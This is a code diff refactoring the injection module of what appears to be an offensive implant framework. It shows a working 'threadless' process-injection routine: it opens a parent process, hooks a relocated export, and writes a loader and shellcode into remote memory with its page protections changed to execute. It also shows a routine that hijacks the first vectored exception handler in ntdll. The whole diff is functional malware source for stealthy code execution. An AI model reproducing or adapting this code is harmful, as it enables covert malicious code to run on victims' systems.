@@ -4,20 +4,17 @@
 
 namespace Injection {
 
-    VOID Threadless(_threadless threadless, void *shellcode, size_t n_shellcode, size_t total) {
+    VOID Threadless(const _threadless &writer, void *shellcode, size_t n_shellcode, size_t total) {
         HEXANE
 
-        // todo: needs MmPivotRegion (Flower) :
-        // Proper JIT: Allocate(RW) -> memcpy(code) -> Protect(RX) -> execute [-> Free]
-
-        HANDLE process = {};
+        HANDLE process = { };
         UINT_PTR ex_addr = 0;
         UINT_PTR ex_addr_p = 0;
         UINT_PTR hook = 0;
         SIZE_T write = 0;
 
-        if (!(ex_addr = Memory::Modules::LoadExportAddress(threadless.Module.Buffer, threadless.Export.Buffer)) ||
-            !(process = Process::OpenParentProcess(threadless.Parent.Buffer)) ||
+        if (!(ex_addr = Memory::Modules::LoadExportAddress(writer.module, writer.export)) ||
+            !(process = Process::OpenParentProcess(writer.parent)) ||
             !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), n_shellcode))) {
             return;
         }
@@ -26,24 +23,24 @@ namespace Injection {
         auto hook_p = hook;
 
         Memory::PatchMemory(B_PTR(&ex_addr_p), B_PTR(&ex_addr), 0, 0, sizeof(LPVOID));
-        Memory::PatchMemory(B_PTR(threadless.Loader.Buffer), B_PTR(&ex_addr_p), EXPORT_OFFSET, 0, sizeof(LPVOID));
-        Memory::PatchMemory(B_PTR(threadless.Opcode.Buffer), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);
+        Memory::PatchMemory(B_PTR(writer.loader), B_PTR(&ex_addr_p), EXPORT_OFFSET, 0, sizeof(LPVOID));
+        Memory::PatchMemory(B_PTR(writer.opcode), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);
 
         if (
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID * , &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, threadless.Opcode.Buffer), threadless.Opcode.Length, &write)) || write != threadless.Opcode.Length) {
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, writer.opcode->data), 0x5, &write)) || write != 0x5) {
             return_defer(ntstatus);
         }
         if (
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID * , &hook_p), &total, PAGE_READWRITE, nullptr)) ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), threadless.Loader.Buffer, threadless.Loader.Length, &write)) || write != threadless.Loader.Length) {
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), writer.loader->data, writer.loader->length, &write)) || write != writer.loader->length) {
             return_defer(ntstatus);
         }
 
         //Xtea::XteaCrypt(R_CAST(PBYTE, shellcode), n_shellcode, Ctx->Config.Key, FALSE);
 
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + threadless.Loader.Length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + writer.loader->length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID * , &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
             return_defer(ntstatus);
         }
@@ -79,7 +76,7 @@ namespace Injection {
             return handler;
         }
 
-        UINT_PTR PointerEncoder(uintptr_t pointer, const bool encode) {
+        UINT_PTR PointerEncoder(uintptr_t const &pointer, const bool encode) {
             HEXANE
 
             uintptr_t encoded = 0;
@@ -97,20 +94,20 @@ namespace Injection {
             return encoded;
         }
 
-        LONG OverwriteFirstHandler(const uintptr_t address, const wchar_t *mod_name) {
+        LONG OverwriteFirstHandler(_veh_writer const &writer) {
             HEXANE
 
-            const auto mod_hash = Utils::GetHashFromStringW(mod_name, x_wcslen(mod_name));
+            const auto mod_hash = Utils::GetHashFromStringW(writer.mod_name, x_wcslen(writer.mod_name));
             const auto ntdll = Memory::Modules::GetModuleEntry(mod_hash);
 
-            const auto entry = Veh::GetFirstHandler(ntdll, "\x00\x00\x00\x00\x00\x00\x00\x00", "xxx00xxx");
-            const auto handler = Veh::PointerEncoder(entry, false) + 0x20;
+            const auto entry = GetFirstHandler(ntdll, writer.signature, writer.mask);
+            const auto handler = PointerEncoder(entry, false) + 0x20;
 
             if (!entry) {
                 return FALSE;
             }
 
-            return Ctx->Nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), C_PTR(address), sizeof(uintptr_t), nullptr);
+            return Ctx->Nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), writer.target, sizeof(uintptr_t), nullptr);
         }
     }
 }
